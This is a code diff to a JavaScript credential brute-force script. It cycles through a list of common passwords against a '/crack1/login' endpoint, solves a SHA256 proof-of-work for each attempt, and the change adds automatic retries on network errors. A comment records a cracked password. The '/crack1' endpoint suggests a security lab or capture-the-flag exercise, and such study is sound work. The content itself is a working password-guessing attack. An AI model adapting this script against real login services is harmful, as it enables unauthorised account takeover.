@@ -149,56 +149,66 @@ let passwordSet = ["12345678", "11111111", "D1lakiss", "88888888", "qq123456", "
 // let passwordSet = ["12345678", "11111111", "D1lakiss", "88888888"];
 
 function login(username, password) {
-    let loginSuccess = false;
+    let requestSuccess = false
+    let loginResult = false;
 
     for (var i = 0; i < Math.pow(2, 255); i++) {
         let mystr = username + password + random + i.toString();
         var s256 = SHA256(mystr);
         var s256hex = parseInt(s256, 16)
         if (s256hex < Math.pow(2, (256 - nonce))) {
-            $.ajax({
-                url: '/crack1/login',
-                type: 'POST',
-                data: JSON.stringify({
-                    'username': username,
-                    'password': password,
-                    'nonce': nonce,
-                    'random': random,
-                    'proof': i.toString(),
-                }),
-                dataType: 'json',
-                contentType: "application/json",
-                async: false, //sync
-                success: function (data) {
-                    // console.log(data);
-                    if (data && data['msg'] && data['msg'].includes("you don\'t proof your work")) {
-                        console.log("Login failed with password: " + password)
-                    } else {
-                        console.log("Login succeeded with password: " + password)
-                        loginSuccess = true
-                    //    Login succeeded with password: Aa123456
+            while (!requestSuccess) {
+                $.ajax({
+                    url: '/crack1/login',
+                    type: 'POST',
+                    data: JSON.stringify({
+                        'username': username,
+                        'password': password,
+                        'nonce': nonce,
+                        'random': random,
+                        'proof': i.toString(),
+                    }),
+                    dataType: 'json',
+                    contentType: "application/json",
+                    async: false, //sync
+                    success: function (data) {
+                        // console.log(data);
+                        requestSuccess = true
+                        if (data && data['msg'] && data['msg'].includes("you don\'t proof your work")) {
+                            console.log("Login failed with password: " + password)
+                            loginResult = false
+                        } else {
+                            console.log("Login succeeded with password: " + password)
+                            loginResult = true
+                            //    Login succeeded with password: Aa123456
+                        }
+                    },
+                    error: async function (data) {
+                        console.warn("Network failed with password: " + password + " .Need to retry.")
+                        console.warn(data);
+                        // do better: retry this password if the request failed caused by network problem or other reasons.
+                        requestSuccess = false
+                        loginResult = false
+                        console.log("Need retry for this password: " + password)
+
+                        await sleep(1000)
                     }
-                },
-                error: function (data) {
-                    console.warn("Network failed with password: " + password + " .Need to retry.")
-                    console.warn(data);
-                    // do better: retry this password if the request failed caused by network problem or other reasons.
-                    // it is currently recorded manually.
-                }
-            });
+                });
+            }
             break
         }
     }
 
-    return loginSuccess;
+    return loginResult;
+
 }
 
 async function enumeratePassword() {
     for (let index = 0; index < passwordSet.length; index++) {
         password = passwordSet[index];
 
-        const loginSuccess = login(username, password);
-        if (loginSuccess) {
+        const loginResult = login(username, password);
+        if (loginResult) {
             break
         }
 
